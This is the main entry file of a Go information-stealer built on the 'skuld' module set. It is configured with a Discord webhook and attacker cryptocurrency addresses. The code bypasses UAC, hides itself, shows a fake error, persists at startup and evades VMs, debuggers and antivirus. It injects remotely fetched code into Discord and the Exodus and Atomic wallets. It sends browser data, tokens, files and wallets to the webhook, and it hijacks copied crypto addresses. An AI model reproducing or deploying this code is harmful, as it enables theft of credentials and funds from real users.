package main

import (
	"github.com/hackirby/skuld/modules/antidebug"
	"github.com/hackirby/skuld/modules/antivm"
	"github.com/hackirby/skuld/modules/antivirus"
	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/modules/clipper"
	"github.com/hackirby/skuld/modules/commonfiles"
	"github.com/hackirby/skuld/modules/discodes"
	"github.com/hackirby/skuld/modules/discordinjection"
	"github.com/hackirby/skuld/modules/fakeerror"
	"github.com/hackirby/skuld/modules/games"
	"github.com/hackirby/skuld/modules/hideconsole"
	"github.com/hackirby/skuld/modules/startup"
	"github.com/hackirby/skuld/modules/system"
	"github.com/hackirby/skuld/modules/tokens"
	"github.com/hackirby/skuld/modules/uacbypass"
	"github.com/hackirby/skuld/modules/wallets"
	"github.com/hackirby/skuld/modules/walletsinjection"
	"github.com/hackirby/skuld/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "https://discord.com/api/webhooks/1424845394390548500/40sLvyiGQvKhUg1TELDOLN99vOLe-VwntoyAGFm4gJi-BVxft1OjVzFtDiuLQJSSZOaq",
		"cryptos": map[string]string{
			"BTC": "bc1q336c9n2tngzl2uk8wfdvr4k0hnf9k6allms7ve",
			"BCH": "",
			"ETH": "0xc9275c390C1EEce6e03625bE99aEb5d458c19390",
			"XMR": "",
			"LTC": "ltc1qajj3hg8z84ekqqr6hy6cplxr60zve4wm8fpmxw",
			"XCH": "",
			"XLM": "",
			"TRX": "",
			"ADA": "",
			"DASH": "",
			"DOGE": "",
		},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	antivm.Run()
	go antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run(
		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
